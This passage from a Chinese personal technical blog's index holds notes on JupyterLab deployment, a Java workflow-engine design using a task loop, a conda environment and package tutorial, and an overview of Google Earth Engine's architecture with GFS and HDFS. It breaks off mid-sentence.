重点:JupyterLab深度定制开发实践\n文件系统：glusterfs\n用户权限：目前我们的Jupyter没有使用jupyterHub来管理用户权限，主要是我们的模式是==每个用户启动一个docker容器的jupyterLab服务==，每个人使用自己的jupyterLab服务，互相不会有干扰，而且JupyterLab我们定义为用户的IDE和工作平台，所以独立容器保证了独立性，也方便后续用户资源计费。在此架构下，==jupyterlab token作为用户认证主要途径，在jupyterLab系统启动时，会将用户的token存储到user service的用户表字段中==，前端页面跳转jupyterlab web UI时，会去user service获取该用户的jupyterLab token，根据此token登录jupyterLab服务，完成认证。 而==目录权限的控制，主要是不同的用户和机构目录挂载到不同的目录==。对于hadoop的访问权限控制，我们会把kerberos/ranger相关配置集成到了app中，并且jupyterLab服务和livy服务都会使用对应的用户USER ID来启动。\nJuypter Notebook 前端二次开发\nJupyter Notebook二次开发的经验（一）——安装开发版本\nJupyter生态二次开发系列(一)\nJupyterHub+Lab：Ubuntu18.04搭建自己的多用户云notebook（安装篇）\nJupyter NoteBook / JupyterLab / JupyterHub 区别与关系简介\n搭建环境方案（根据需求调整）：\n线上环境：The Littlest JupyterHub + JupyterLab 开发环境：JupyterHub + JupyterLab 不管是Jupyter Notebook还是Jupyter Lab，都是只支持单用户的使用场景，作为一个可交互的web服务，所有用户都在同一个目录下操作（甚至同时在编辑同一个脚本），多数情况下很不方便。Jupyterhub可以解决这个问题。 但是当我们把Jupyterhub安装，启动服务后默认确实JupyterNoteBook，如何换成JupyterLab呢？👇\nJupyterLab on JupyterHub(JupyterLab+JupyterHub)（JupyterLab JupyterHub）\n思路 1.数据用Drive单独存储\n2.写函数库让用户调用\n例如：from google.colab import files\n1 2 3 4 5 6 from google.colab import files with open(\u0026#39;example.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(\u0026#39;some content\u0026#39;) files.download(\u0026#39;example.txt\u0026#39;) 3.示例代码段\n4.ipynb工程分享\nhttps://colab.research.google.com/drive/131SUrBstRNKv6n4GtK582ULCEjVaV1V9?usp=sharing\n5.ipywidgets调参\n6.服务的发布与共享\n7.互操作引擎\n问题收集 1.运行代码的时候出现错误，弹框提示内核似乎挂掉了，它很快将自动重启。\n**解决：**出现这种情况的时候，需要将虚拟环境中的包全部用conda命令进行安装，用pip安装就会出现这个问题（把用pip安装的包删了重新用conda装：conda install -c conda-forge wordcloud）\n","permalink":"https://chance7bin.github.io/posts/note/jupyter/","summary":"Jupyter初探 Jupyter Notebook介绍、安装及使用教程 Jupyter使用详解 Jupyter notebook安装 安装了Anaconda发行版时已经自动安","title":"Jupyter"},{"content":"引言 设计工作流的目的：\n实现模型的自动化执行：对于一个需要繁琐步骤，通过多种方法计算的需求来说，通过构建工作流，可以省去一些重复的工作\n实现模型的并行化计算：对于一整个计算流程来说，有些计算是可以一起执行的，因此可以根据计算的先后顺序构建出一整个计算流程，缩短一整个计算流程的运行时间\n工作流是一种为满足数据收集、处理、计算、分析需求，按照流程之间的逻辑关系进行描述并使用计算机完成自动或半自动流程运行的过程。\n工作流模型 工作流的执行传递依赖于流程中的数据流，单元与单元之间的依赖关系实际上是一种输入输出数据之间的有向传递关系\n构建工作流时，各计算单元是按一定逻辑组织的，流程中包含顺序、选择、迭代等逻辑结构，各个元素的执行顺序也有先后，需要对流程的运转进行控制。\n在对流程完成定义和构建之后，工作流需要对工作流流程进行分析，对流程中过程进行验证。根据其中的逻辑关系对执行先后顺序进行控制；并针对各功能单元进行解析，对包含计算任务的单元进行调度与运行。\n各计算节点的元素关系 1）串行关系\n2）并行关系\n3）分支关系\n4）选择关系\n5）迭代关系\n结构化描述文档 结构化描述模块示意图\n结构化描述文档\n工作流对象类图\n浏览器的Event Loop 参考链接：\nhttps://juejin.cn/post/7079092748929728548#comment\nJS是单线程还是多线程的？ 答案：JS是单线程。如果您深究为什么是单线程的呢？\n其实这是与它的用途有关，因为JS是一门浏览器脚本语言，主要用途是进行用户操作和操作DOM，所以它只能是单线程的，否则会带来很多复杂的同步问题。\n浏览器是多进程还是单进程 答案：浏览器是多进程的。为什么说是多进程的？ 你说是就是吗？ 凭什么呢？\n当我们浏览网页的时候，有的时候是不是会遇到浏览器卡死的情况。如果我们开了多个会话，就假如我们一边刷力扣，一边开发程序，写循环的时候，写了一个死循环，导致了我们开发的这个会话的崩溃，如果浏览器是单进程的情况下，力扣这个时候也会崩溃。\n当然浏览器肯定不会允许这样的事情发生，它就是多进程的，多个会话互相不影响\n事件循环 首先js代码先执行主线程的代码，也就是同步的代码，从上至下，遇到异步代码交给浏览器，浏览器专门开了一个线程，其中浏览器线程中维护这两个队列，一个微任务队列，一个宏任务队列。\n宏任务队列 Macrotask Queue: ajax、setTimeout、setInterval、Dom监听等 微任务队列 Microtask Queue: Promise的then回调、 Mutation Observer API、queueMicrotask 注意:每一次执行宏任务之前，都是要确保我微任务的队列是空的，也就是说从代码执行的顺序来说微任务优先于宏任务。\n但是存在插队的情况，也就是说当我微任务执行完了，要开始执行宏任务了（有多个宏任务），宏任务队列当队列中的代码执行了，宏任务队列里面又有微任务代码，又把微任务放入到微任务队列当中。\n此时特别注意！！！从严格的意义来说，紧接着是先进行编译的宏任务，但是此时微任务里面有任务，才去执行的微任务队列，而不是直接去执行的。这些异步的代码交给js执行，这样三者形成了一个闭环，我们称之为事件循环。\n流程运行控制引擎 元素执行控制 任务循环机制 借鉴chrome v8等浏览器引擎事件循环（Event Loop）的成熟策略，设计了基于任务循环（Task Loop）的流程运行并发模型和运转控制策略。Task Loop维护一个运行控制线程，核心是队列维护方法query。query维护四个队列，分别对应等待队列waiting list、执行队列running list、完成队列completed list和失败队列failedList，通过对元素进行遍历处理检查状态，并分别压入对应的队列。等待队列中的元素检查数据是否完备、执行条件是否满足，满足则执行；执行队列中的元素向计算节点请求更新状态；完成队列和失败队列则根据各自情况更新输出数据和状态。TaskLoop不断循环，从而检查各个元素状态并更新qurey队列，将条件满足的元素压入执行。而在容错方面，设计了错误滞后策略即多次运行失败认定失败来减小错误影响。\n通过这种控制方法，各个满足执行前提条件的元素可以互不干涉、并发执行，同时将元素的依赖关系和流程的逻辑结构映射为元素的执行条件和数据准备情况，可以满足流程运行控制的要求的前题下简化程序结构、解耦各部分的功能。\n流程说明 （1）每个工作流开辟一个单独的线程不断循环计算（Task Loop）\n（2）每一次循环都遍历等待队列waiting list的所有计算单元，判断其数据是否已经准备完毕（前面步骤是否已经执行完），如果准备完毕则将该计算单元作为任务加入到执行队列running list中，并开始计算（调用服务）\n（3）输入数据的类型分为两种，一种是直接输入（value），一种是前面的流程结果（link），所以在设置输入数据的属性的时候需要根据类型从不同的来源获取到对应的值\n（4）需要迭代的计算单元，对于为link（前面的流程结果）的输入数据，需要重新计算前面流程结果，所以需把关联的计算单元也加入到等待队列waiting list中\n（5）对于条件判断（分支和循环），根据条件的成立与否（true/false）将下一个计算单元加入到等待队列waiting list中\n（6）每个计算单元计算完成后，根据计算状态将计算单元加入到完成队列completed list或失败队列failedList中，输出数据需加入到数据共享池SharedData中，以便后续计算单元从池中获取到前面的计算结果。对于迭代模型，当还未到达最大迭代次数的时候会将当前计算单元重新加入等待队列，同时创建一个临时文件池TempOutput（独立于SharedData），记录最新的运算结果\n（7）当等待队列waiting list以及执行队列running list中没有计算任务时，整个工作流流程结束\n工作流功能实现 工作空间 工作流详情 后端关键代码 Service\n1 2 3 4 5 public String runTask(MultipartFile file, String userName){ // ... TaskLoopHandler taskLoopHandler = new TaskLoopHandler(task); new Thread(taskLoopHandler).start(); } TaskLoopHandler\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public class TaskLoopHandler implements Runnable { private Task task; public TaskLoopHandler(Task task){ this.task = task; } @Override public void run() { TaskLoop taskLoop = new TaskLoop(); // 初始化任务 taskLoop.initTaskRun(task); // 初始化等待队列 List\u0026lt;ModelAction\u0026gt; waitingModels = ((Map\u0026lt;String,List\u0026lt;ModelAction\u0026gt;\u0026gt;)taskLoop.checkActions(task).get(\u0026#34;model\u0026#34;)).get(\u0026#34;waiting\u0026#34;); while (true){ taskLoop.query(waitingModels, task); Map\u0026lt;String, Object\u0026gt; checkedList = taskLoop.checkActions(task); waitingModels = ((Map\u0026lt;String,List\u0026lt;ModelAction\u0026gt;\u0026gt;)taskLoop.checkActions(task).get(\u0026#34;model\u0026#34;)).get(\u0026#34;waiting\u0026#34;); if(taskLoop.finalCheck(task)){ log.info(\u0026#34;全部运行结束\u0026#34;); break; } } log.info(\u0026#34;线程结束\u0026#34;); } } TaskLoop\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 public class TaskLoop { ConcurrentHashMap\u0026lt;String, ShareData\u0026gt; tempOutput; // 临时数据池 ConcurrentHashMap\u0026lt;String, ShareData\u0026gt; shareData; // 共享数据池 // 将准备好的任务推入running list public int query(List\u0026lt;ModelAction\u0026gt; waitingModels, Task task){ int result = 0; for(int i=0;i\u0026lt;waitingModels.size();i++){ ModelAction modelAction = waitingModels.get(i); // 检查数据是否准备好 if(checkData(modelAction,task)){ runModel(modelAction); } } return result; } // 检查集成任务中的所有任务状态 public Map\u0026lt;String,Object\u0026gt; checkActions(Task task) { checkModels(task); // ... } // 检查task中的单模型状态 public Map\u0026lt;String,List\u0026lt;ModelAction\u0026gt;\u0026gt; checkModels(Task task){ Map\u0026lt;String,List\u0026lt;ModelAction\u0026gt;\u0026gt; result = new HashMap\u0026lt;\u0026gt;(); List\u0026lt;ModelAction\u0026gt; waitingModel = new ArrayList\u0026lt;\u0026gt;(); // 等待队列 List\u0026lt;ModelAction\u0026gt; completedModel = new ArrayList\u0026lt;\u0026gt;(); // 完成队列 List\u0026lt;ModelAction\u0026gt; runningModel = new ArrayList\u0026lt;\u0026gt;(); // 执行队列 List\u0026lt;ModelAction\u0026gt; failedModel = new ArrayList\u0026lt;\u0026gt;(); // 失败队列 // 一系列操作 checkXxx(); // 检查 updateXxx(); // 更新 judgeCondition(); // 条件判断 // ... result.put(\u0026#34;waiting\u0026#34;,waitingModel); result.put(\u0026#34;running\u0026#34;,runningModel); result.put(\u0026#34;completed\u0026#34;,completedModel); result.put(\u0026#34;failed\u0026#34;,failedModel); } } 前端关键代码 前端使用mxGraph实现\n","permalink":"https://chance7bin.github.io/posts/design/%E5%B7%A5%E4%BD%9C%E6%B5%81%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/","summary":"引言 设计工作流的目的： 实现模型的自动化执行：对于一个需要繁琐步骤，通过多种方法计算的需求来说，通过构建工作流，可以省去一些重复的工作 实现模型","title":"工作流设计与实现"},{"content":"Anaconda指的是一个开源的python发行版本，其包含了conda、Python等180多个科学包及其依赖项。\nAnaconda是一个开源的包、环境管理器，可以用于在同一个机器上安装不同版本的软件包及其依赖，并能够在不同的环境之间切换。\nconda介绍 conda 是开源包（packages）和虚拟环境（environment）的管理系统。\npackages 管理： 可以使用 conda 来安装、更新 、卸载工具包 ，并且它更关注于数据科学相关的工具包。在安装 anaconda 时就预先集成了像 Numpy、Scipy、 pandas、Scikit-learn 这些在数据分析中常用的包。另外值得一提的是，conda 并不仅仅管理Python的工具包，它也能安装非python的包。比如在新版的 Anaconda 中就可以安装R语言的集成开发环境 Rstudio。 虚拟环境管理： 在conda中可以建立多个虚拟环境，用于隔离不同项目所需的不同版本的工具包，以防止版本上的冲突。纠结Python 版本时，可以建立 Python2 和 Python3 两个环境，来分别运行不同版本的 Python 代码。 conda的环境管理 conda的环境管理功能允许用户同时安装若干个不同版本的python，并能自由切换。\n1、安装一个新环境 比如要安装一个python 3.4环境，需要做如下操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 创建一个名为python34的环境，指定Python版本是3.4（不用管是3.4.x，conda会为我们自动寻找3.4.x中的最新版本） conda create --name python34 python=3.4 # 安装好后，使用activate激活某个环境 conda activate python34 # for Windows source activate python34 # for Linux \u0026amp; Mac # 激活后，会发现terminal输入的地方多了python34的字样，实际上，此时系统做的事情就是把默认2.7环境从PATH中去除，再把3.4对应的命令加入PATH # 此时，再次输入 python --version # 可以得到`Python 3.4.5 :: Anaconda 4.1.1 (64-bit)`，即系统已经切换到了3.4的环境 # 如果想返回默认的python 2.7环境，运行 conda deactivate # for Windows deactivate python34 # for Windows source deactivate python34 # for Linux \u0026amp; Mac # 删除一个已有的环境 conda remove --name python34 --all 如果出现An unexpected error has occurred. Conda has prepared the above report.\nemm vpn没关\n更换conda下载源\n1 2 3 4 conda config --add channels conda-forge conda config --set channel_priority strict conda install jupyterlab-variableinspector #设置之后就不需要在 -c conda-forge 了 2、查看已安装的环境 用户安装的不同python环境都会被放在目录~/anaconda/envs 目录下：\n1 2 3 4 5 6 $ conda info -e # conda environments: # base * /Users/hqs/anaconda3 # 当前被激活的环境会显示一个星号或括号 python27 /Users/hqs/anaconda3/envs/python27 python37 /Users/hqs/anaconda3/envs/python37 Conda包管理 1、查看操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # 查看当前环境下已安装的包 $ conda list # packages in environment at /Users/hqs/anaconda3: # # Name Version Build Channel _ipyw_jlab_nb_ext_conf 0.1.0 py36_0 alabaster 0.7.12 py36_0 ... ... ... zope.interface 4.6.0 py36h1de35cc_0 zstd 1.3.3 h2a6be3a_0 # 查看某个指定环境的已安装包 $ conda list -n python27 # packages in environment at /Users/hqs/anaconda3/envs/python27: # # Name Version Build Channel ca-certificates 2018.03.07 0 certifi 2018.10.15 py27_0 libcxx 4.0.1 hcfea43d_1 libcxxabi 4.0.1 hcfea43d_1 libedit 3.1.20170329 hb402a30_2 libffi 3.2.1 h475c297_4 ncurses 6.1 h0a44026_0 # 查看package信息 $ conda search numpy Loading channels: done # Name Version Build Channel numpy 1.5.1 py26_0 anaconda/pkgs/free numpy 1.5.1 py26_0 pkgs/free numpy 1.5.1 py26_4 anaconda/pkgs/free ... ... ... 2、包管理操作 Anaconda管理python包。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 安装package conda install pandas # 使用参数安装package conda install -n python37 numpy # 使用-n指定要按照的环境名称 # 不使用-n则按照在当前活跃环境 # -c指定通过某个channel安装 # 更新package conda update pandas conda update -n python37 numpy # 删除package conda remove -n python37 numpy 3、conda管理 conda将conda、python都视为package，因此也可以使用conda来管理conda和python的版本。\n1 2 3 4 5 6 7 8 9 # 更新conda，保持conda最新 $ conda update conda # 更新anaconda $ conda update anaconda # 更新python $ conda update python # 当前环境如果是python 3.7，conda会将Python升级为3.7.x系列当前最新版本 conda和pip安装库之间的区别 conda和pip安装库的区别\n在Anaconda中，无论在哪个环境下，只要通过conda install xxx的方式安装的库都会放在Anaconda的pkgs目录下，如:E:\\python\\anaconda\\pkgs\\numpy-1.18.1-py36h48dd78f_1。这样的好处就是，当在某个环境下已经下载好了某个库，再在另一个环境中还需要这个库时，就可以直接从pkgs目录下将该库复制至新环境（将这个库的Lib\\site-packages中的文件复制到当前新环境下Lib中的第三方库中，也即Lib\\site-packages中，这个过程相当于通过pip install xxx进行了安装）而不用重复下载。\nconda和pip卸载库的区别\npip是在特定的环境中进行库的安装，所以卸载库也是一样的道理，通过pip uninstall xxx就可以将该环境下Lib\\site-packages中对应的库进行卸载了。\n如果通过conda uninstall xxx删除当前环境下某个库时，删除的只是当前环境下site-packages目录中该库的内容，它的效果和通过pip uninstall xxx是一样的。如果再到另一个环境中通过conda install xxx下载这个库，则还是通过将pkgs目录下的库复制到当前环境。若要清空这个pkgs下的已下载库，可以通过命令conda clean -h进行实现。\n","permalink":"https://chance7bin.github.io/posts/note/%E4%BD%BF%E7%94%A8anaconda/","summary":"Anaconda指的是一个开源的python发行版本，其包含了conda、Python等180多个科学包及其依赖项。 Anaconda是一个开","title":"使用Anaconda"},{"content":"1.GEE的产品形态和序列 1.1 GEE基本产品形态 已有的 GIS 云服务通常分为基础云服务（IaaS, Infrastructure as a Service）和 软件云服务（SaaS, Software as a Service）。\n常见的基础云服务有 Google Cloud Platform、百度网盘等，具有较高的可定制性（High level of customizability），但其提供的功能通常局限于数据传输、共享等基础操作。\n常见的软件云服务包括GLOBAL FOREST WATCH、Imazon、CLIMATE ENGINE 等，为特定的研究方向提供数据、技术和高度封装（High level of built-in functionality）的工具，功能丰富，但缺乏灵活性，难以支持多学科领域的交叉研究。\n在此背景下，GEE 建立了一种平台级云服务（PaaS, Platform as a Service），在支持基础云服务的基础上，提供大量已封装的基础 GIS 方法与模型，供用户交互式或代码式调用，以支持复杂 GIS 分析与模拟的定制化操作。\nGEE代码执行流程\n程序运行时，Code Editor 会将编写的代码通过 API 接口发送给 GEE 后台；后台收到代码后，会根据代码逻辑==分配到不同服务器上操作==；显示的逻辑会经过后台计算后返回给编辑器地图界面显示，同时将输出的结果输出到数据报告栏中。通常情况下，运行结果以栅格的方式显示在地图显示区，还可对像素进行信息拾取，但对于一些属性或者统计类的报表信息，只能通过数据报告栏进行查询。同时，程序的运行调试也常常会利用数据报告栏对分步结果进行查看。==数据报告栏还可扩展为独立的 Task Manager 界面，支持任务结果的查询和筛选==。\n1.2 GEE模块序列 GEE 是在 Google 数据中心系列支持技术上所建立的包括 Borg 集群管理系统、Spanner 分布式数据库、谷歌文件系统以及用于并行管道执行的 Flume Java 框架在内的云平台。\n从 GEE 的应用角度考虑，GEE 的模块序列可以分为：\n（1）底层的 Google 数据中心技术支撑，包括分布式数据存储技术、分布式计算技术、瓦片切图技术、并行计算和调度技术等\n（2）中层的资源服务，包括在线公开使用的数据集和用户无感的高性能算。==在分布式高性能计算方面==，GEE 主要是使用了 Google 本身的分布式计算框架，按照 Java Just-In-Time (JIT)策略，将前端代码映射为 Java 程序，在 Flume Java 框架的支持下，实现了分布式的高性能计算。\n（3）高层丰富的编程应用接口。GEE 本身提供了 Explorer 平台，供用户在网页上选择数据、选择计算方法，按照零编程的方式实现影像数据的分析。但此种方式较为局限，无法满足用户的定制式需求，尤其是在用户需要自定义分析算法的情况下。因此，GEE 提供了 Code Editor 平台。在此平台上，用户可以编写==脚本型代码（优化后的 Javascript）==，并且有丰富的示例代码来辅助用户进行开发。除了 Code Editor 这种在线工作模式，GEE 提供了 ==Python 接口==和 ==REST 风格调用接口==，辅助用户在编写 Python 脚本来调用远程的 GEE 服务、编程应用型的Javascript 代码来将 GEE 与 Web 应用相结合。\n（4）与 Google 生态完美融合的应用社区。在以上底层-中层-高层模块框架\n体系的基础上，GEE 与整个 Google 生态进行了整体性的融合。\n1.3 GEE数据生态圈 （1）Earth Engine Data Catalog\nGEE 提供了大量被广泛使用的地理空间数据集供用户在线调用。目前，地理空间数据集包含 700 多种数据，总数据量已经达到 50+ PB，且正以 1 PB/月的速度增长，基本接近实时更新。\n（2）第三方数据 awesome-gee-community-datasets\n一直以来，GEE 的用户都在积极地创建、上传和管理共享数据集。但绝大部分都不会被 GEE 纳入 Data Catalog 中。awesome-gee-community-datasets 填补了这一空白，支持用户将数据提交或推荐至该社区数据集，并在 GEE 中直接调用。\n（3）个人 Cloud Assets\n为支持跨学科复杂地理数据的计算与分析，GEE 积极鼓励用户上传个人数据，并提供了 250G 的默认资源空间（Legacy Assets），该空间中的数据仅与 GEE 账户相关联，不参与 GEE 的云端集成。每个用户仅有一个遗留资源空间。在Google Cloud Platform 的支持下，用户可进一步将数据上传至云端，获取更多的云资源空间（Cloud Assets）。\n此外，基于一种身份与资源管理（Identity and Access Management , IAM）体系，用户可以通过定义谁（身份）对哪些资源具有哪种访问权限（角色）来精细化地管理访问权限。\n1.4 GEE应用生态圈 ==GEE 提供了 JavaScript、Python 和 REST 三种 API 接口，以多样化地支持用户调用服务，从而将复杂的地理空间分析转换为向 GEE 的请求。==\n（1）基于 JavaScript 应用开发，主要是利用 Code Editor 平台，在线编写JavaScript 脚本代码（Google 稍加改进后的 JavaScript 语法），通过在线编程的方式调用 GEE 后台的数据服务和计算服务，获取数据分析的结果。\n用户在 Code Editor 上创建的脚本文件都会拥有一个独立的标识符 ID，可以通过 Publish 的方式来共享链接，其他用户通过点击此链接可以直接访问脚本文集，并且该脚本执行的结果同样会直接共享给其他用户，这种方式又称为==快照Snapshot 模式==。\n（2）基于 Python 应用开发，主要是面向离线型的用户。此处所谓的离线应用，并不是指脱离网络来开发，用户仍然需要联网并能够访问 GEE 的服务；只是编程的环境是离线的，主要是利用 Python 脚本来开发程序。在桌面端的 Python 编程环境中（例如 PyCharm、Spyder、Jupyter 等），可以==通过引入 GEE 的包的形式==，调用 GEE 的功能函数。==这些功能函数仍然会发送到 GEE 的后台服务，经过服务端的计算之后，能够获取相应的结果==。\nGEE 本身也与 Google Cloud Service 联合，通过 ==Colaboratory（简称 colab）平台==能够在线进行 GEE 的 Python 编程。\n（3）基于 REST API 应用开发，主要面向业务应用开发者，需要对网络服务相关知识具有一定的掌握。\n基于 JavaScript的在线 Code Editor 能够帮助用户直接使用 GEE，门槛很低但局限在 Code Editor 平台本身；基于 Python 的 GEE 应用能够与整个 Python 的大生态相融合，形成 Python 语言环境的应用生态；而==基于 REST API 的 GEE 应用==，是在编程的底层构建了统一的访问协议，原则上能够与 C++、C#、Java、VB 等各种编程语言和环境相融合，融入到更加宽广的应用生态圈中。这种策略也是与 Google APP Engine 保持理念一致的。\n在以上 JavaScript、Python、REST API 生态圈的基础上，GEE 还在横向上与一些常用的 GIS 分析工具开展了集成和融合，主要包括：\n（1）GEE 与 QGIS 的集成。QGIS 本身开放有二次开发接口，并提供了 Python 语言的脚本开发环境（类似于 ArcPy）。GEE 与 QGIS 的集成同样是通过 Python 脚本的形式来完成。\n（2）GEE与Jupyter的集成。==GEE 与 Jupyter 的集成构建了一个 geemap 平台==，通过配置 Jupyter 的环境，用户可以利用 Jupyter Notebook 来编写代码，无需依赖于 PyCharm、Spyder 等桌面端的编程 IDE。\n（3）GEE 与 R 工具的集成。GEE 与 R 的集成并不是在底层语言上开展的，而是通过 R 语言来调用 GEE的 Python API。上层编码使用 R 语言，通过 rgee 在内部转换成 Python 的 API，再向 GEE 服务端请求，实现相关功能的调用。\n（4）GEE 与 Julia 平台的集成。GEE 与 Julia 的集成同样是通过调用 GEE 的 Python API 来实现的，具体的技术流程与前述 R 类似。\n2.GEE的技术演化路径及现行技术体系 2.1技术演化路径 2.2现行技术体系 Google Earth Engine 从创建之初就是伴随着 Google 云服务总体布局而发展的，其在数据存储方面直接采用 Google 的分布式存储技术（如 ==BigTable== 等），在文件管理方面采用 Google 文件系统 ==GFS（Google File System）==，在分布式计算方面主要采用 ==Google MapReduce==，在集群管理方面采用 Google 的大规模集群管理系统（如 ==Borg== 等）。在此基础上，GEE 从以下四个层面开展了整体的架构设计：\n（1）数据服务层，主要包括==瓦片化存储服务器==和==用户资源服务器==。瓦片化存储服务器主要是对 GEE 平台中大量的遥感影像数据、地理空间数据按照瓦片的方式进行切片、存储和管理。瓦片化的优势一方面体现在地图显示，按照分块的瓦片来请求数据能够降低网络请求的峰值压力，能够更好的与地图显示相结合；另一方面，==瓦片化后的数据也能够有效的支持并行计算==，尤其是在逐像素计算的相关分析应用，多个同时进行计算最后再合并可以大大提升计算效率。用户资源服务器主要是对 GEE 用户的个人数据进行管理。==通过 GEE 的 Assets 机制==，个人用户可以上传自己的数据，并且可以通过 URL 链接的方式分享自己的数据。\n（2）计算服务层，主要包括==实时计算==和==异步计算==两种模式。实时计算是指用户通过编程接口来调用后台的算法服务，后台直接执行该算法并将结果返回到客户端。实时计算一般是用户地图展示和结果打印（GEE 的 print 函数），这种方式==在计算服务端通过利用 Google 的分布式集群管理、分布式并行计算等技术，极大提升了计算效率==，从而达到所谓“实时”的效果。本质上实时计算和异步计算在服务节点的调用方面并没有大的区别。异步计算主要是按照任务的方式来管理，用户创建任务后无需停留在页面等待，任务计算成功后按照配置的导出（GEE的 Export 函数）实现结果的保存。实时计算和异步计算在形式上的区别主要在于：==实时计算需要在页面等待，关掉页面后 print 的结果就丢失了；异步计算的任务可以在 Task Manager 任务管理器中查看，任务结束后直接保存结果==。\n（3）业务逻辑层，主要是定义了 REST 风格的网络请求接口，并在 REST 网络接口的基础上定义了 JavaScript 和 Python 两种脚本语言的编程接口。GEE 的REST 接口遵循 GET、POST、UPDATE、DELETE 的协议风格，可以通过标准的网络请求协议来驱动后端服务（需通过身份验证）。由于网络编程对于遥感和 GIS 科研工作者而言并不普及，因而在此基础上 GEE 提供了更加易用易懂的脚本编程接口。最为常用的 JavaScript 脚本（Google 稍加了一些语法的改进），在 GEECode Editor 平台上的编程即通过此种脚本。JavaScript 脚本的方式主要是面向在线应用；此外还有针对离线应用的 Python 脚本。在 Python 脚本中同样定义了关于 GEE 的分析方法。\n（4）前台应用层，主要包括了 Code Editor 平台、Explorer 平台和其他第三方网络应用。尤其是 Code Editor 平台，已经成为 GEE 的代表性应用平台。在Code Editor 平台上可以编写分析代码，并将分析应用结果发布成定制式的应用APP。用户可以将自己定制的 APP 发布成公开的网站，并加以推广。此外，一些研究机构和企业也可以基于 GEE 开发形成第三方网络应用。\n2.3数据存储技术——分布式文件系统 分布式文件系统（Distributed file system, DFS）是一种允许文件通过网络在多台主机上分享的文件系统，它主要针对非结构化数据（文件），利用大量的计算机资源来同时完成大量的工作，以获取高性能和高可扩展性。\n2.3.1 Google File System Google File System（GFS、GoogleFS）是 Google 在 2003 年公布的分布式文件系统，它通过大量的普通廉价机器为海量的非结构化数据提供==高性能、高可用性和高扩展性==的分布式数据存储方案。无论在设计理念还是应用规模上，GFS 都是划时代的，但是现在看来 Google 当初的设计充满了简单粗暴。为了简化系统，GFS 仅适用于以下场景：\n（1）文件系统中的文件大（GB 级及以上）而少\n（2）对文件操作多为顺序读取、复写或追加，几乎没有随机访问\n如图 2-2 所示，==一个 GFS 集群由一个管理节点（master）、多个块服务器（chunk server）和多个客户端（client）组成。==GFS 将元数据保存在 master 节点中，将客户端需要的数据分块（chunk）存储在多个 chunk server 中，client 首先访问 master节点，获取 chunk server 信息，再访问相关的 chunk server 完成数据的读写工作。这样的设计方法实现了控制流和数据流的分离，极大的减轻了 master 的负担，同时由于文件被分成多个块（chunk）进行分布式存储， client 可以同时访问多个chunk server，以支持 I/O 可以高度并行。\nChunk server 负责具体的数据存储工作，每个 chunk server 挂载多个磁盘设备并将其格式化为本地文件系统（如 XFS）。在 GFS 中，一个大的文件会被分为多个 chunks，chunk 是数据复制的基本单位，它的大小是固定的(默认是 64MB)。每个 chunk 拥有有全局唯一的文件句柄，它会被复制到多个 chunkserver（默认是3 个）以 Linux 的文件形式存储，以保证数据的可用性和可靠性。\nMaster 承担整个系统控制流枢纽的角色，它维护了所有元数据信息，包括文件命名空间、文件访问控制信息、块（chunk）位置信息和块到 chunkserver 的映射等信息；同时它也控制了整个系统的活动，包括租约（chunk lease）管理、孤儿块（chunk）垃圾回收和块在服务器之间的迁移；单 master 的设计支持系统能使用全局信息进行复杂的块放置和副本决策。然而由于只有一个 master 节点，系统必须尽可能减少 master 节点对读写的参与，优化节点之间的交互，避免 master处的负载过大。\n上图是 GFS 一次写的主要流程，步骤如下：\n（1）client 向 master 询问 chunk 的首要副本和其他副本的位置等信息\n（2）Master 返回首要副本的标识和所有副本的位置，client 缓存该数据\n（3）Client 将数据发送到所有副本\n（4）当所有副本确认收到数据，client 将发送写请求给首要副本\n（5）首要副本转发写请求给所有副本\n（6）所有副本回复首要副本操作结果\n（7）首要副本回复 client，任何副本上的任何错误都会报告给客户端\n2.3.2 HDFS HDFS（Hadoop Distributed File System, Hadoop 分布式文件系统）是 Hadoop项目于 2004 年对 GFS 的开源实现。HDFS 虽然和 GFS 原理相同，但运算速度上达不到 Google 论文中的标准，并且在并发写的处理上，采用了一些简化的做法。尽管如此，==HDFS 算是开源分布式文件系统中最完整实现了 GFS 论文中的概念模型==。Hadoop 也由于其开源特性，使得它成为分布式计算系统事实上的国际标准。\nHDFS 集群由单个 NameNode，和多个 DataNode 构成。NameNode 管理文件系统命名空间的主服务器和管理客户端对文件的访问组成，如打开，关闭和重命名文件和目录。负责管理文件目录、文件和 block 的对应关系以及 block 和DataNode 的对应关系，维护目录树，接管用户的请求。DataNode（数据节点）管理连接到它们运行的节点的存储，负责处理来自文件系统客户端的读写请求，同时还执行块创建，删除。Client(客户端)代表用户通过与 NameNode 和 DataNode交互来访问整个文件系统，HDFS 对外开放文件命名空间并允许用户数据以文件形式存储。用户通过客户端（Client）与 HDFS 进行通讯交互。\nGFS 与 HDFS 的共同点：\n都采用单一主控机+多台工作机的模式，由一台主控机(Master)存储系统全部元数据，并实现数据的分布、复制、备份决策，主控机还实现了元数据的 checkpoint和操作日志记录及回放功能。工作机存储数据，并根据主控机的指令进行数据存储、数据迁移和数据计算等\n都通过数据分块和复制（多副本，一般是 3）来提供更高的可靠性和更高的性能。当其中一个副本不可用时，系统都提供副本自动复制功能。同时，针对数据读多于写的特点，读服务被分配到多个副本所在机器，提供了系统的整体性能\n都提供了一个树结构的文件系统，实现了类似与 Linux 下的文件复制、改名、移动、创建、删除操作以及简单的权限管理等\nGFS 与 HDFS 的不同点：\nGFS 支持多客户端并发 Append 模型，允许文件被多次或者多个客户端同时打开以追加数据；HDFS 文件只允许一次打开并追加数据，客户端先把所有数据写入本地的临时文件中，等到数据量达到一个块的大小（通常为 64MB），再一次性写入 HDFS 文件\nGFS 采用主从模式备份 Master 的系统元数据，当主 Master 失效时，可以通过分布式选举备机接替，继续对外提供服务；而 HDFS 的 Master 的持久化数据只写入到本机，可能采用磁盘镜像作为预防，出现故障时需要人工介入\nGFS 支持数据库快照，而 HDFS 不支持\nGFS 